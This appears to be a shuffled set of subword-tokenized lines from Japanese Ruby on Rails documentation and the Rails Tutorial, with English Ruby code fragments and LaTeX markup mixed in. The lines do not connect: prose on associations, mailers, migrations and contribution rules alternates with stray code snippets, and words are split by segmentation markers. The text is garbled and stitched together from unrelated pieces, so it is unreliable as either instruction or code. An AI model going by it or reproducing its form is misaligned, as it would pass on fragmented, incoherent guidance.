▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 4 )
▁follow _ redirect !
▁この節で 使用 された さまざまな 関連付け を理解する の に 一番 良い のは 、 次の 節 で 行 な っている ように 実際の Web インターフェイス で使用する ことです 。
▁ リレーションシップ の アクセス制御
▁* ▁Rails ▁3 以上 では 、 Ruby ▁1▖8▖7 以降 が 必 須 です 。
▁TIP : ▁[ シェル の プロンプト に Git ブランチ 名を 表示 ]( http :// q ug start ▖ com / blog / git - and - svn / add - color ed - git - branch - name - to - your - s hell - p r o mp t / ) すると 、 今 どの バージョン で 作業 している か が その 場 で 確 認 できる ので 便利です 。
▁ 123 ▖ to _ s (: human ) ▁# ▁=> ▁" 123 "
▁ 文字列 \ k ode { ’ activation ’} でも 同じ ことができます が 、 Ruby では シンボル を使う 方が 普通 です 。
▁$ ▁bundle ▁exec ▁rake ▁db : rollback
▁I ' m ▁so r ry ▖
▁rest ▁= ▁hash ▖ extract !( : a ) ▁# ▁=> ▁ { : a =>1 }
▁ 適切な \ k ode { form \_ for } を使用することで 、 リスト \ ref { fig : login _ mockup } の ユーザー登録フォーム を参考に して 、 リスト \ ref { code : signup _ form } に示した ような モックアップ に 従 った ログインフォーム を簡単に 作成 できます ▁( 図 \ ref { code : login _ form }) 。
▁` constantize ` メソッドは 、 レシーバの 定数 参 照 表現 を 解決 し 、 実際の オブジェクトを返します 。
▁< p > ご 入 会 あり が と う ご ざ います ▟ どう ぞ お 楽 し み ください ま せ 。
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁2011
▁Article ▖ includes (: comments )▖ where (" comments ▖ visible ▁= ▁true ")▖ references (: comments )
▁development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次は { p 2 } で 自動生成 した User メイラー の {3} プレビュー ファイル {/3} の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s }) 。
▁B ▖ x ▁# ▁=> ▁: b
▁{0} 図 7▖2 1 {/0} {1} ブラウザで ページ を再 読み込み して フラッシュメッセージ が表示され な くなる ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ flash _ reload ed _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ backgroundColor ▁= ▁$ ( this )▖ data (" background - color ")
▁これは Rails の アセットパイプライン の 戦 略 として 採 用 されています 。
▁ 結果を 図 \ ref { fig : new _ signup _ page } の 新規ユーザー の ページ ▁( URI ▁ / signup ) ▁ に示します 。
▁Rails に 貢献 する 皆 様 には 、 必ず 「 コミット を ス カ ッ シ ュ 」 して い ただ く よう お 願 い します ▟ ス カ ッ シ ュ とは 、 複数の コミット を ひとつ に まとめ ること です ▁( 訳 注 : ▁ 後 述 の ` git ▁re base ▁- i ` で ス カ ッ シ ュ できます ) 。
▁ ある スコープ を モデルの すべての クエリ に 適用 したい場合 、 モデル 自身 の 内部で ` default _ scope ` メソッド を使用する ことができます 。
▁` yield ` の 最も 単純な 使用 法 は 、` yield ` を 1 つだけ 使用 して 、 現在 レンダリング されている ビューの コンテンツ 全体 を その 場所に 挿入する という ものです 。
▁create ▁app / helpers / blorgh / comments _ helper ▖ rb
▁# ▁ コントローラに 以下 を書く
▁ こう して 見 ると 、 HTML の 構造 は title タグ の内容 も含め て どの ページ も 完全に 同じです ▟ 異なる 点 があると すれば 、\ k ode { body } タグ の 内 側 の コンテンツ だけです 。
▁しかし 、 使用している データベースの 内部 エンコード 設定 が UT F -8 になって い ない場合 、 UT F -8 の 文字 の一部 を データベースに そのまま 保存 できない ことがあります 。
▁ 実は Ruby ▁1▖9 では 、 ハッシュの 要素 の順序 が 入力 順 と同じ であること を 保 証 しています が 、 ハッシュ を 特定の 順序 に依存し て カウント するのは 得 策 ではありません 。
▁* ▁` config ▖ action _ mailer ▖ sendmail _ settings ` は 、`: sendmail ` 配信 方法を 詳 細 に設定する の に 使用できます 。
▁\ ref { sec : logging _ in } では 、 Rails の \ k ode { session } メソッドを使用して ユーザー ID を 保存 しました が 、 この 情報 は ブラウザを閉じ ると 消え てしまいます 。
▁これにより 、 無効な オブジェクトが データベースに保存 される ことを 防止 します 。
▁作成した コードをリスト \ ref { code : email _ downcase } に示します
▁これは 、 以下の ための サンプルアプリケーション です 。
▁ ステータスフィード が追加され 、\ emph { Ruby ▁on ▁Rails チュートリアル } の 中 心 となる サンプルアプリケーション が と う と う 完成 しました 。
▁ パーシャル を呼び出す 時に 指定 する コレクション が 複数形 の場合 、 パーシャル の 個 別の インスタンス から 、 出力する コレクション の 個 別の メンバ にアクセス が 行われます ▟ このとき 、 パーシャル 名 に 基 づ いた 名前を持つ 変数 が使用されます 。
▁\ k ode { image _ tag } の 効果 を確かめるため に 、 ブラウザから 生成された HTML を見てみましょう
▁ メイラー の動作 は コントローラと きわめて 似 通 っています 。
▁デフォルトは 以下の とおり です 。
▁JavaScript を 正しく 分 離 すること が できたので 、 今後 の 変更 が 容易に なり ました 。
▁ このコード では 、 リクエスト の種類 に応じた アクション を実行する ために \ k ode { respond _ to } を使用しています
▁ 正しい 抽 象 化 の 方法 を見つけ 出 す 方法 の 1 つ は 、 Web アプリケーション における \ emph { following } の動作 を どのように 実装 するか を じ っ く り 考え ること です 。
▁ 文字列 は 式 展開 されます
▁ patch ▁ / users / 17 ?
▁この ブログ アプリケーション のような シンプルな Rails アプリケーションでは 、 テンプレート の 置き場所 は 1 箇所 ですが 、 複雑な アプリケーションでは さまざまな 場所に テンプレート が 置かれ る こともあります 。
▁ 異なる コントローラの テンプレート を 指定 している ことを より 明示的に したい場合は 、 以下のように `: template ` オプション を使用することもできます ▁( Rails ▁ 2▖2 以前 では この オプションは 必 須 でした ) 。
▁\ k ode { ▖ gitignore } が ディレクトリに 見当たらない 場合は 、 ファイル ブラウザ や エ ク ス プロ ー ラ で 隠 し ファイル を表示する よう 設定 を変更する 必要がある かもしれません 。
▁# ▁ 完全な 実装 は 第 12 章 「 ユーザーを フォローする 」 を参照してください 。
▁#### ▁ MultiJSON の 廃 止
▁\ k ode { digest } メソッドは 他にも 様々な 場所 で 使用できます ▟\ ref { sec : remember _ token } では \ k ode { digest } を User モデル で 再 利用 します 。
▁ head ▁: bad _ request
▁このメソッド の動作 は 、 使用している Ruby のバージョン によって 異なる 可能性があります 。
▁ とは い う もの の 、 バグ か 機能 か の違い は 、 送 って い ただ いた パッチ を ▁( ボ ツ にする かどうか という より は ) 、 どの リリース に 反 映 するか という 扱 い の違い で しか ないこと が ほとんど です ▟ バグ 修正 は 早 め に リリース され 、 機能 追加 は 大きな リリース 変更 の ときに 反映され る といった 具 合 です ▟ 私たちは 、 修正 パッチ と同様に 機能 追加 も 大 歓迎 しています 。
▁これは \ k ode { assert \_ select } よりも ずっと 抽 象 的な メソッドです ▟ 特に 、 ▁\ k ode { assert \_ select } では どの HTML タグ を 探 す のか 伝える 必要があります が 、\ k ode { assert \_ match } メソッドでは その 必要 がない 点が 違い ます 。
▁\ text tt { bcrypt - ruby } ライブラリ では 、 セキュア ハッシュ を生成する 際の 計算 の 負 荷 を \ emph { コ スト フ ァ ク ター ▁( cost ▁ factor ) ▁ } として 指定 できます 。
▁この 呼び出し が 行われ ない と 、 エンジンの コンポーネント が アプリケーション 側 に 「 漏 れ 出 す 」 リスク が生じ 、 思 わ ぬ 動作 が発生し たり 、 エンジンの 重要な コンポーネント が 同じ ような 名前 の アプリケーション 側 コンポーネント によって 上書き され てしまった り する 可能性があります 。
▁詳細については 、[ jquery - ujs ▁ wiki ]( https :// github ▖ com / rails / jquery - ujs / wiki / ajax ) に 掲 載 されている イベント を参照してください 。
▁* ▁ コンテンツ が 複数の セクション から なる レイアウト 作成 法
▁ データベースから 取り出す レコードを 特定の 順序 で 並 べ 替 え たい場合 、` order ` を使用できます 。
▁ここでは 、 送信 ボタン 用の 共通 部分を 分 解 するために \ k ode { let } メソッドを使用して \ k ode { submit } 変数 を定義し ています 。
▁te }╼╼ ▁% ▁subsection ▁rails _ environments ▁( end )╼╼ ▁\ subsection { Users リソース } ▁% ▁( fold )╼ ▁\ label { sec : a _ users _ resource }╼╼
▁Rails の 慣例 では 、 関連付けの 主キー は ` id ` カラム に保存 されている ことを 前提と します 。
▁ そのような ケース を見つけ たら 、 必要に応じて pull ▁request で 議 論 してください ▟ 直接 doc rails を変更する ことは く れ ぐ れ も 行 わ ないでください 。
▁なお 、 上の 画像 では エラーメッセージ の 下 の 部分 は 切り 捨 て て あります 。
▁@ assemblies ▁= ▁@ part ▖ assemblies
▁Ruby において \ k ode { nil } は 特別な オブジェクト です ▟ Ruby の オブジェクト のうち 、 オブジェクト そのもの の 論理値 が false になる のは 、( \ k ode { false } という オブジェクト 自身 を除いて ) ▁nil \ emph { だけ } です 。
▁ サンプルアプリケーションの 開発 では 、「 モックアップ 」「 テスト駆動開発 ▁( TDD ) 」「 統合テスト 」 の 3 つの 手法 を 採 り 入 れ ます 。
▁ここで 、 URL が \ href { http :// localhost :3000/ users /1}{/ users /1 } と 表示され ていることに注目してください ▟ ご想像 のとおり 、 この 数字 \ k ode {1} は {2} {3} 図 2▖2 {/3} {/2} の \ k ode { id } 属性 その ものです 。
▁3 89 ▖ 3 23 14 ▖ to _ s (: rounded , ▁ precision : ▁0 ) ▁# ▁=> ▁3 89
▁HTML 構造 を削除し た Home ページ
▁たとえば 、 リスト { p 0} の マイグレーション によって 作成された {2} email {/2} 属性 について 考えてみましょう 。
▁CDN に保存 されている コンテンツ が 古 く な った り 壊 れ ていた り すると 、 メ リ ッ ト よりも 害 の方が 大きく なります 。
▁* ▁` config ▖ eager _ load _ paths ` は 、 パス の配列 を引数に取り ます ▟ Rails は 、 cache _ classes が オン の 場合に この パス から 事前 一括読み込み ( eager ▁load ) します 。
▁WARNING : ▁ モデル 結合 時の 不 足 分 自動 削除 は 即座に 行われます ▟ さらに 、 その 際に destroy コールバック は トリガ ー されません ので 注意が必要です 。
▁ それ まで は 、 Rails が デフォルトで 提供する ビルトイン のバリデーション ヘルパー を 中 心 に 解説します 。
▁ この問題 を 回 避 するために 、` git ` 呼び出し を ` after _ bundle ` ブロック 内に 置く ことが できるようになりました 。
▁respond _ to ▁: html , ▁: json
▁ユーザー登録 失敗
▁これで 、 最初の ユーザーに も 仲 間 が で きました ▟ しかし 今度は 逆に 、1 つの ページに \ emph { 大量の } ユーザー が表示され て しま っています 。
▁また 、 URL ヘルパー に 以下の 設定 を与え ます 。
▁" production "▖ inquiry ▖ production ?
▁orders ▖ delete ( object , ▁ ▖▖▖)
▁ 既に 説明 した ` valid ?` メソッド や ` invalid ?` メソッド の他に 、 Rails では ` errors ` コレクション に 対応 し 、 オブジェクトの 正 当 性 を 検 査 するための メソッドが 多数 用意されています 。
▁| ▁HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁名前付きヘルパー ▁|
▁* ▁ 末尾に " _ id " がある場合 は 削除します 。
▁ } ▖ free z e
▁ 多くの Rails 開発者 は 、 異なる ビューの 間 で 共通 に使用する パーシャル を保存する ディレクトリ として 、\ k ode { shared } ディレクトリ を使用します 。
▁ prev _ month ▁( last _ month )
▁リスト { p 0} と同じ ファイルに {2} assert _ difference {/2} を使った テスト を追加する と 、 リスト \ ref { code : a _ test _ for _ valid _ submission } のようになります 。
▁ 純 粋 な RSpec では 、\ emph { カスタム マッチ ャ ー } を使用して この問題 を解決する ことができます ▟ カスタム マッチ ャ ー を使用すると 、 上のコード を 以下のように 簡潔 に記述 することができます 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ r c 1 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁このヘルパーは 、 指定された 属性 が 空 であること を検証します 。
▁たとえば 、 これらの マクロ は 以下の Dependencies モジュール で使用され ています 。
▁ どちらの ページ も データ を表示する もの なので 、( REST の慣習 に基いて ) ▁\ k ode { GET } リクエスト に応答する ために \ text tt { get } を使用して URL を生成します ▟\ text tt { member } メソッドは 、 ユーザー id を含む URL に その ルート ▁( route ) ▁ が 応答 できるように する ものです 。
▁( Turbolinks の詳細については 、 本書 の 次の ド ラ フ ト 版 で説明します ) 。
▁ 存在しない 日付 が 指定 される と ` ArgumentError ` が発生し ます 。
▁上の コマンド を実行すると 「 Co ul d ▁not ▁find ▁ ’ railties ' 」 という エラーが表示され る 場合は 、 インストール した Rails のバージョン が正しく ない 可能性があります ▟ リスト \ ref { code : installing _ rails } のとおり に コマンドを実行 した かどうかを 念のため ダブルチェック してください 。
▁この 点 において 、 良い テストコード がある ということは 非常に 貴 重 です ▟ リファクタリング する 際に バグ が 混 入 する 可能性 を 劇 的に 小 さ く してくれる からです 。
▁この 変更 が 行われた ことにより 、 rails アプリケーション 以外の フォームから送信 される 、 静 的な セッション CSRF トークン に依存する リクエスト を検証する 際に は 、 この マ ス ク 済み 真 正 性 トークン の ことを 常に 考 慮 する必要があります のでご注意ください 。
▁この コマンド を実行すると 、 先ほど 定義 した ユーザー と マイクロポストの データモデル を使って 、 Heroku 上の データベース が更新され ます 。
▁` pluralize ` メソッドでは オプションで ` count ` パラメータ を使用できます 。
▁まずは ユーザー の一覧を表示 する \ href { http :// localhost :3000/ users }{\ text tt { index } } ページ を見てみましょう ▟ もちろん 、 この時点で はまだ ユーザーは 登録 されていません ▁( {2} {3} 図 2▖ 4 {/3} {/2} ) 。
▁ 残 る 課題 は 、 皆さん が この チュートリアル を い か に 最 後 まで や り ぬ く か 、 それ だけ である と 言 って よいでしょう 。
▁この コマンド を実行すると 、` Article ` モデル が 作成されます ▟ その中に は string 型の ▁ _ title _ ▁ 属性 と text 型の ▁ _ text _ ▁ 属性 が作成され ています 。
▁$ ▁bundle ▁exec ▁rake ▁db : migrate ▁ VERSION = 0
▁if ▁requirement ▖ multiline ?
▁Active ▁Record オブジェクトを 単 体 または コレクション として 渡す ことができます 。
▁これにより 、 記 述 が や や 短 く なり 、 動作 が や や 明 示 的 で なくなります 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / instance _ variable s ▖ rb ` です 。
▁`: only ` オプション や `: except ` オプションを使用することで 、 これらの ルーティング を 微 調 整 できます 。
▁上のコードでは 、 許可 された 属性 リスト に \ k ode { admin } が含まれ て \ emph { いない } ことに注目してください 。
▁class ▁ Book sController ▁< ▁Application Controller
▁Rails の 3 つの 環境
▁config ▖ action _ dispatch ▖ default _ headers ▁= ▁ {
▁ユーザー登録 できるように なったら 、 ログイン や ログアウト を できる 仕 組み を 作り ▁( 第 \ ref { cha : log _ in _ log _ out } 章 ) 、 第 \ ref { cha : updating _ showing _ and _ deleting _ users } 章 から は 不 正 な アクセス を 取り 扱 う 方法 について 学 んで い きます ▁(\ ref { sec : requiring _ logged _ in _ users }) ▁ 。
▁` config / database ▖ yml ` ファイル と 環境変数 ` ENV [' DAT A BASE _ URL ']` が 両方 存在する 場合 、 両者 の設定 は マージ して 使用されます 。
▁ 保存 に 失敗した場合 は 、 単 に \ ref { sec : unsuccessful _ signup s } で開発した とおり の動作 が 実行 { されます 。
▁SQL クエリ で 並び順 を指定する 句 がない場合 に ` reverse _ order ` を実行すると 、 主キー の 逆 順 になります 。
▁ このコード における \ k ode { have _ x path } メソッド の使用 法 に注目し てください ▟ ▁これは 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / XPath } { XPath } を使用して HTML 5 を含む XML ドキュメント を 自 在 に ナ ビ ゲ ート すること の できる 、 極めて 高 度 かつ パ ワ フル な テクニック です 。
▁\ ref { sec : destroy ing _ microposts } のコード で 、 Micropost モデルと その イン ター フ ェ ー ス が完成しました 。
▁ この場合は 、 コードが カウント を変更 \ emph { しない } ことが 期 待 されます ので 、\ k ode { not _ to } メソッドで 表現 しています 。
▁* ▁ カスタム のバリデーション メソッド の作成
▁Rails の 慣例 では 、 相手 の モデル 上の 外部キー を保持し ている カラム名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 関連付け 名 が 使用される ことを 前提と します 。
▁* ▁` t ogg le !
▁ ア メ リ カ 英語 を使用すること ▁( ▁* color * ▁ 、 ▁* center * ▁ 、 ▁* mod ul ar ize * ▁ など ) 。
▁( コード 例 に 続けて エントリ を書く こともできます ▟ issue 番号 は ここに 書き ます )
▁2 つ目の 記 法 は 、 シンボル と ハッシュ ロ ケ ッ ト の 組み合わせ を 、 以下のように キー の名前 の ▁( 前 ではなく ) ▁ 後に コロン を 置 き 、 その後 に 値が 続 く ように 置き換え た ものです 。
▁\ k ode { row } クラス と \ k ode { col - md - 4 } クラス も 追加 しておきます ▟ これらの クラスは Bootstrap の一部 です 。
▁ body : ▁email _ body ,
▁ テストが 書かれてい ない 。
▁ ╼ ▁* = ▁require _ tree ▁ ▖
▁ モデル ファイル ` app / models / article ▖ rb ` の 中 身 は 、 以下のように 驚 く ほど シ ン プ ル です 。
▁Home ページの タイトル 確 認 用に テスト を更新する 。
▁このセクションでは 、 エンジンの MVC 機能を メ イン の Rails アプリケーションに 追加 または オーバーライド する方法 について解説します 。
▁def ▁d er ive _ class _ name
▁ ヒント については RailsCast 「\ href { http :// r ailscasts ▖ com / episodes / 87 - generating - rs s - feed s } { RSS フィード の 生成 } ▁( 英語 )」 を参照してください 。
▁ sy s 	 0 m 1 ▖ 06 8 s
▁# ▁config ▖ action _ mailer ▖ sendmail _ settings ▁= ▁ {
▁ただし 、 テスト駆動開発 が どんな 仕 事 に対して も 常に 正しい 手法 である とは限りません ▟ この ことは 十分 に 理解 しておいてください ▟ 「 最初に テストを書く べ き である 」 、「 テストは ひとつ ひとつ の 機能を 完全に カ バー する べ き である 」 、「 すべての 箇所 を テスト すべき である 」 など のような 教 条 的な 主 張 を 正 当 化 できる 理由は ど こ にも ありません 。
▁Microposts コントローラの \ k ode { destroy } アクション
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / class / attribute ▖ rb ` です 。
▁# ▁=> ▁ ActiveModel :: Strict V al id ation F a ile d : ▁ 名前 は 空欄 に できません
▁#### # ▁` collection ▖ create ( attributes ▁= ▁{}) `
▁{0} 図 8 ▖9{/0} {1} サインイン した ユーザーに リンク と ド ロ ッ プ ダ ウ ン が表示される ようになった ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ with _ signout _ link _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁A do be ▁Read er の場合は 、 ドキュメント 画面 を 右 クリック して ▁[ Previous ▁View ] をクリックします 。
▁self を省略した 結果を リスト \ ref { code : remember _ me _ css } に示します 。
▁TIP : ▁ 出力する オブジェクトに対して ` to _ json ` を呼び出す 必要はありません 。
▁token
▁\ k ode { content } 属性を ▁( そして \ k ode { content } 属性 \ emph { のみ } を ) ▁ アクセス可能 にする 。
▁ オーバーライド は できません 。
▁ クラウド IDE ではなく ローカル コンピュータ で 作業 している場合 は 、\ k ode { heroku ▁open } コマンドで ブラウザ 表示 することもできます 。
▁test 環境 における 以前の デフォルト値 は 、` config ▖ assets ▖ compile ▁= ▁true `、` config ▖ assets ▖ compress ▁= ▁false `、` config ▖ assets ▖ debug ▁= ▁false `、` config ▖ assets ▖ digest ▁= ▁false ` です 。
▁ 多くの システム では 、 Ctrl - d キーを 押 して 終 了 することもできます ▟)
▁最後に 、 デモアプリケーション で 使用している Rails の コントローラと モデルの クラス 階層 について 簡単に 解説します 。
▁Rails ▁5 の production 環境では 、 デフォルトの ログ レベル が `: info ` から `: debug ` に 変更 される 予定です 。
▁ それ に 伴 い 、\ ref { sec : layout _ link _ tests } で実装した 簡 明 かつ 表現 豊 か な 統合テスト に対して 、 ▁ いくつかの テストを 追加 していきます 。
▁ これはリスト \ ref { code : home _ view _ erb _ title } で使用されていました 。
▁上の SQL を 日本語 で 書く と 、「 ゲ スト による コメント が 1 つ ある 記事 をすべて 返す 」 となります 。
▁OS ▁X ▁P re view の場合は メニュー の ▁\ text tt { [ 移動 ] ▁> ▁[ 戻 る ]} ▁ で 戻 れ ます 。
▁` silence _ warning s ` メソッドと ` en able _ warning s ` メソッドは 、 ブロック が 継 続 する 間 ` $ V ERB OS E ` の値 を変更 し 、 その後 リ セット します 。
▁RSpec の S h ar ed ▁ Example を使用して テストの 冗 長 性 を 排 除 する 。
▁この 書 式 に従う タグ は \ emph { 閉 じ タグ } として 知 ら れ ています 。
▁Rails ▁ と ▁Rack
▁scaffold ジェネレータ が 最初に 行なう のは ` active _ record ` ジェネレータ の 呼び出し です ▟ これは マイグレーション の 生成 と その リソース の モデル を生成します 。
▁上の 例 の場合 、`: from ` ヘッダー に この クラスの すべての メッセージ で使用する 値を 1 つ 設定 しています 。
▁ } ▁%></ td >
▁このメソッド を実行して も 、 関連付けられたオブジェクト は destroy されません 。
▁次に 、 パスワードが 一致する 場合 と 一致し ない場合 について それぞれ 記 述 します 。
▁ 別の 言い 方 を すれば 、 ログイン していない ユーザーが 編集 ページ にアクセス し よう として いた なら 、 ユーザーがログイン した 後に はその 編集 ページ にリダイレクトされる ように する の が望ましい 動作 です 。
▁SQLite 3 ▁ のみ 、 Active ▁Record のテスト で 以下を実行し ます 。
▁#### # ▁`: inverse _ of `
▁ マイクロポストの U I に対する 統合テスト
▁# ▁arguments : ▁' - i ▁- t '
▁この コンソール は 、 development 環境 の ビュー で表示される すべての エラー ページに も 表示されます 。
▁### ▁C s r f Helper
▁ 英 小文字 を 少なくとも 1 文字 以上 繰り返す
▁\ ref { sec : a _ user _ class } で 扱 った カスタム ビルド クラスの \ k ode { User } を 思い 出 してください ▟ この クラスは 、\ k ode { name } と \ k ode { email } を 属性 に 持つ ユーザー オブジェクト でした 。
▁invoke ▁test _ unit
▁これらの クラス 同士 の関係 を {0}{1} 図 2▖1 7 {/1}{/0} に示します 。
▁ユーザー登録 時に メールアドレス を検証する 手順を 追加 してください 。
▁ 安全 な 引数 であれば 、( エスケープ なしで ) 直接 追加 されます 。
▁* ▁` render ▁: html ` を実行すると content ▁type は ` text / html ` に設定され る
▁#### ▁options _ for _ select
▁ここで 作成し よう と している のは 新しい HTML フォーム なので 、` ERB ` 言語 が使用されます 。
▁* ▁` having `
▁< option ▁value =" 3 " ▁select ed =" select ed "> C h in a </ option >
▁ ルート ルーティング を有効に するには 、「 # 」 文字 を削除し て コメント を 解除 し 、 コード を書き換え ます ▁( リスト \ ref { code : hello _ root _ route })▟ これにより 、 Rails の ルート ルーティング にアクセスすると Application コントローラの \ k ode { hello } アクション が 動作します
▁今度は 期待どおり テストにパス するはずです 。
▁ パスワード リ マ イン ダ ー
▁最初に 以下の 2 つの コマンドを実行 します 。
▁ メイラー は 、 モデル や コントローラ と同様に \ k ode { rails ▁generate } で 生成 できます 。
▁たとえば 、 以下のコード は エラー ヘッダー のみ の レスポンス を返す ことができます 。
▁たとえば 、` " SSL Error "▖ underscore ▖ camelize ` を実行し た 結果は ` " S s l Error " ` になり 、 元に戻 り ません 。
▁{" development "=>{" adapt er "=>" sqlite 3 ", ▁" database "=>" NOT _ my _ database "} }
▁JavaScript を サポート しない ブラウザ を サポート する 必要がある 場合は 、 フォーム と \ text tt { POST } リクエスト を使用して \ text tt { DELETE } リクエストを 偽 造 することもできます ▟ こちら は JavaScript が なくても 動作します
▁render ▁status : ▁: for b id d en
▁config ▖ assets ▖ cache _ store ▁= ▁: memory _ store , ▁ { ▁size : ▁ 32 ▖ me g abytes ▁ }
▁<%= ▁form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] , ▁method : ▁: put ▁do ▁| f | ▁%>
▁上のコードでは 、 コレクション の メンバ に応じて 、 customer パーシャル または employee パーシャル が自動的に 選択 されます 。
▁ ちなみに これは Twitter の 認可 モデルと 同じです 。
▁また 、 3 項 演算子 で 代入 文 を 置き換え ることもできます 。
▁\ k ode { where } メソッド を使うと 、 Active ▁Record を通して 選択 ▁( 部分 集合 を 取り出す こと ) ▁ が できる
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups (3) ▁ { | group | ▁p ▁group }
▁* ▁` config ▖ action _ controller ▖ perform _ caching ` は 、 アプリケーションで キャッシュ を行なう かどうかを指定します 。
▁Get ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁` exists ?` は 複数の 値を 引数に 取 ることができます ▟ ただし 、 それらの 値 のうち 1 つ でも 存在してい れば 、 他の 値が 存在してい なくても ` true ` を返します 。
▁* ▁` ActionDispatch :: Session :: CookieStore ` は 、 セッションを cookie に保存 する 役 割 を 担 います 。
▁#### # ▁`: validate `
▁変更の結果 を リスト \ ref { code : relationships _ controller _ ajax } に示します 。
▁たとえば 、` ActionController :: Url Re writer ` では 以下のように 定義 されています 。
▁root ▁to : ▁" admin # index "
▁### ▁ ローカル ブランチ で アプリケーション を実行する
▁このメソッドは 、 特殊な 変換 を 行いたい 場合に 便利な ことがあります 。
▁Rails には 、 各 コントローラ や アクションに 割り当て る 特定の レイアウト を もっと 正確に 指定 する方法 がいくつも 用意されています 。
▁ 既存の issue の 解決 を 手 伝 う
▁=> ▁" 42, ▁ 8, ▁17 , ▁7 , ▁ foo , ▁bar "
▁{0}{1} 第 8 章 {/1}{/0} では 、 この \ k ode { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁\ k ode { index } アクションに \ k ode {@ users ▁= ▁User ▖ all } という 行 があります ▁( 図 \ ref { fig : mvc _ detailed } の 3 に相当 )▟ これによって 、 User モデル から すべての ユーザーの 一覧 を取り出し ▁( 4 ) 、\ k ode {@ users } という 変数 に保存 します ▁( 5 )▟ なお 、 @ users は 「 あ っ と ▁ ゆ ー ざ ー ず 」 と発音します 。
▁xml ▖ tag !( "
▁上のコードでは 、 関連付け が \ k ode { has _ many ▁: followed _ users } と同じ 形式 になる ことを 強 調 するために 、 あえて \ k ode { : source } キー を付け て あります が 、 もちろん 省略 しても構いません 。
▁ ステージング エリア の状態 を知る には \ k ode { status } コマンド を使用します 。
▁-- ---------------- ----------------
▁ただし Web からの ユーザー登録 はまだ できない ▁( 第 \ ref { cha : sign _ up } 章で 完成させます ) ▁ ので 、 今回は Rails コンソール を使って ユーザーを 手動で 作成する ことにしましょう 。
▁ こうすることで フルパス の URL が 引 用 され 、 メールの URL が 正常に 機能 するようになります 。
▁ デフォルト値 は ▁" alt er n ate " ▁ です 。
▁date ▖ beginning _ of _ hour ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 :00:00 ▁+0200 ▁2010
▁リスト { p 0} の {2} hello {/2} アクションを 複 製 して 、 第 2 の アクション {2} goodbye {/2} を追加しましょう ▟ この アクションは 、「 goodbye , ▁world !」 という テキスト を表示します 。
▁ prev _ week ▁( last _ week )
▁ ライブラリ で使用する CSS ▁( C ascad ing ▁Style ▁Sheet ) 、 JavaScript ファイル 、 画像 などの アセット
▁作成した コードをリスト \ ref { code : test _ helper _ digest } に示します
▁ デプロイ する 前に テストを 走 ら せ ています が 、 こういった 習慣 を 身につけ ておく と 開発 に 役 立 ち ます 。
▁### ▁` re where `
▁* ▁` config ▖ assets ▖ prefix ` は アセットを 置く ディレクトリ を指定します 。
▁ シ ング ル ト ン を 避ける ことで 、` ! !` や 三項演算子 のような 人 工 的な 表現 を 避ける ことができ 、 リファクタリング も しやすくなり ます ▟ さらに 、 実装 で 呼び出される メソッドが 返す 値 の 表現 が 少し でも 違 う と コードが 正常に動作し ない という 事 態 も 避 け られます 。
▁\ ref { sec : comments _ for _ various _ reader s } でも 詳 しく 解説 している とおり 、 Web 開発 は まったく の 初心者 が ち ょ っ と 頑 張 った だけで 簡単に 学 べ る ような もの ではありません 。
▁100 人 でも かなり 大 き い 数 である と思います し 、 今後 は 数 千 ユーザーに 増え る 可能性 もあります 。
▁### ▁ コマンドライン インジェクション
▁( この 演習 を 提 案 し 、 コード を提供 してくれ た \ href { http :// al ex cha f fe e ▖ com /}{ A le x ▁C ha f fe e } に 感 謝 します ) 。
▁Expires Active ▁On
▁ 例外 的な ケース についても 調 査 し 、 ドキュメント に 盛 り 込 む こと 。
▁ ド ロ ッ プ ダ ウ ン 選択 ボックス を作成します 。
▁ これはリスト \ ref { code : remember _ method } で使用されていました 。
▁# ▁▖▖▖
▁\ k ode { user ▖ relationships } 属性 のテスト 。
▁<%= ▁ audio _ tag ▁" m us ic ▖ mp 3 " ▁%>
▁* ▁`: minimum ` ▁- ▁ 属性 はこの 値 より 小さな 値を 取 れ ません 。
▁{0} 図 1 ▖9{/0} ▁{1} Markdown を使用して フォーマット された 改良 版 \ k ode { README } ファイル ▟\ href { http :// railstutorial ▖ org / images / figures / new _ readme _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ 場合によっては ` has _ one ` で使用される クエリ を カスタマイズしたくなること があります 。
▁ グループ
▁ 新しい リンクを レイアウト に追加する ときに 、 Bootstrap の 機能 を使用して ド ロ ッ プ ダ ウ ン メニュー を 実現 しましょう ▟ 詳細については 「\ href { http :// twitter ▖ github ▖ com / bootstrap / components ▖ html } { Bootstrap コンポーネント } ▁( 英語 )」 を参照してください 。
▁ 古 い バージョンの Rails では 、 欲 しい 振る舞い に するためには 生の SQL を書く しか 選択 肢 が なかった のですが 、 Rails ▁4▖0 から は 次のように Ruby の 文法 でも 書 け る ようになりました 。
▁< td > Hello ▁World !
▁ ほとんどの 生 徒 は プログラミング 経験 が 乏 しい 時点 から ス ター ト しています が 、 強 い 意 志 と 高い モ チ ベ ー ション を も っています ▁( 上 達 には これら が必要です ) 。
▁ データモデル を 設計 している と 、 時に 自分自身 に 関連付け られる 必要のある モデルに 出 会 う ことがあります 。
▁ コメントアウト して いた 箇所 を 元に戻す と 、 テストが ▁\ passing \ ▁ するよう になるはずです 。
▁end
